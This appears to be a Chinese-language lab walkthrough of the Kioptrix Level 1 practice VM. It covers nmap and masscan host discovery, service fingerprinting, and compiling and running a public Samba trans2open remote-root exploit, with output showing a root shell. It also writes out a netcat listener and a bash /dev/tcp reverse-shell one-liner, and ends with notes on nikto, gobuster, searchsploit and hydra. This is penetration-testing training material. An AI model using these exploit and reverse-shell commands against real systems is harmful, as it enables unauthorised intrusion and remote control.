# 靶前知识
## 子网后缀过长导致扫描速度变慢的方法
标准-sn探活时长
nmap -sn 172.25.32.0/19
>Nmap done: 8192 IP addresses (2 hosts up) scanned in 318.76 seconds

加速版
nmap -sn -n -T4 172.25.32.0/19
-sn:不扫端口，-n不做dns，-T4加速
Nmap done: 8192 IP addresses (2 hosts up) scanned in 217.50 seconds


ARP 扫描
nmap -sn -PR 172.25.32.0/19

只扫一小段
nmap -sn 172.25.57.0/24

提高并发
nmap -sn --min-rate 1000 172.25.32.0/19
nmap -sn --max-retries 1 172.25.32.0/19
Nmap done: 8192 IP addresses (2 hosts up) scanned in 45.47 seconds

masscan
masscan 172.25.32.0/19 -p80,443 --rate=10000
这个快但是不知道扫的什么

## 靶机步骤
- **Discover the target:** `arp-scan` or `netdiscover`.  
    找出目标： `arp-scan` 或 `netdiscover` 。
- **Fingerprint services:** `nmap` (with scripts and version detection).  
    指纹服务： `nmap` （带脚本和版本检测）。
- **Web recon:** browser + Nikto + Gobuster.  
    网络侦察：浏览器 + Nikto + Gobuster。
- **Exploit and prove:** searchsploit, Metasploit (optional), Hydra for logins.  
    利用并验证：searchsploit、Metasploit（可选）、Hydra 用于登录。

# 具体流程

## 信息收集
利用nmap探活和指纹探测
```bash
└─# nmap -sn 192.168.199.159/24                 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-19 04:23 EDT
Nmap scan report for 192.168.199.1
Host is up (0.00091s latency).
MAC Address: 00:0C:29:7C:3A:16 (VMware)
Nmap scan report for 192.168.199.142
Host is up (0.00013s latency).
MAC Address: 90:E8:68:52:71:EB (AzureWave Technology)
Nmap scan report for 192.168.199.233
Host is up (0.12s latency).
MAC Address: C2:0D:60:89:74:1F (Unknown)
Nmap scan report for 192.168.199.159
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 13.95 seconds

```
```bash
└─# nmap -sS -sV -p- 192.168.199.1
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-19 04:25 EDT
Nmap scan report for 192.168.199.1
Host is up (0.0037s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:7C:3A:16 (VMware)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.89 seconds
```
发现Samba（2.2看wp才知道），尝试利用Metasploit
```bash
msfconsole
search smb_version
set RHOSTS 192.168.199.1
msf6 auxiliary(scanner/smb/smb_version) > run
[*] 192.168.199.1:139     -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.199.1:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
利用远程RCEexploi
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                 | multiple/remote/10.c
```bash
──(root㉿kali)-[/home/kali/Desktop/exploit]
└─# cp /usr/share/exploitdb/exploits/multiple/remote/10.c 10.c          
└─# ls
10.c  764.c
└─# gcc 10.c -o fucksamba                               
└─# chmod +x fucksamba                                      
└─# ./fucksamba           
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
Usage: ./fucksamba [-bBcCdfprsStv] [host]
-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
-B <step>       bruteforce steps (default = 300)
-c <ip address> connectback ip address
-C <max childs> max childs for scan/bruteforce mode (default = 40)
-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
-f              force
-p <port>       port to attack (default = 139)
-r <ret>        return address
-s              scan mode (random)
-S <network>    scan mode
-t <type>       presets (0 for a list)
-v              verbose mode

```

利用远程连接
```bash
└─# ./fucksamba -b 0 -v 192.168.199.1  
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Verbose mode.
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Using ret: [0xbffffed4]
+ Using ret: [0xbffffda8]
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)

```
nc -lvnp 4444
bash -i >& /dev/tcp/192.168.199.159/4444 0>&1
完成回连获取root shell

### 额外内容
除了samba还有mod_ssl/2.8.4的poc


# 作者文章
## 主机发现
**Discovery: netdiscover or arp-scan**
## 浏览器信息收集 
当 `nmap` 显示 Web 端口（通常为 80 或 443）时，请使用普通浏览器打开。依次浏览：
- 首页和 `/robots.txt` （奇怪的禁止路径）。
- 登录表单（请注意参数名称，以便稍后使用 PentestMonkey 风格的速查表）。
- 任何明显的版本横幅或 `Server:` / `X-Powered-By:` 标头。

`nikto -h http://192.168.56.101` 通常足以告诉你是否存在明显过时的 Apache 模块、目录列表或危险的默认文件。Nikto 的设计本身就比较“嘈杂”，但在像 Kioptrix 这样的封闭实验室中，这反而是一种特性，而不是缺陷。

**Gobuster 用于暴力破解目录**
- `gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt`
- 如果技术栈需要，则添加 `-x php,txt,bak` 。

## **从服务到外壳：Searchsploit、Metasploit 和 Hydra**

1. **searchsploit：您的离线漏洞利用搜索引擎**
`searchsploit` 允许你无需打开浏览器即可在 Kali 终端中搜索 Exploit-DB：

- `searchsploit mod_ssl 2.8.7`
- `searchsploit samba 2.2.1a`

2.  **Metasploit：将其作为学习工具，而非拐杖。**
在某些 Kioptrix 层级，针对特定服务问题（例如 `mod_ssl` 漏洞）存在 Metasploit 模块。关键在于将 Metasploit 视为验证你理解程度的工具，而不是“按下按钮就能获得 shell”。
3. **hydra：当凭证成为大门**
`hydra` 是针对 SSH、FTP 或基本 HTTP 身份验证等服务进行受控密码猜测的首选方法——但请记住，您是在实验室环境中，而不是在生产网络中。使用从应用程序上下文中提取的小型字典，而不是大型转储文件。

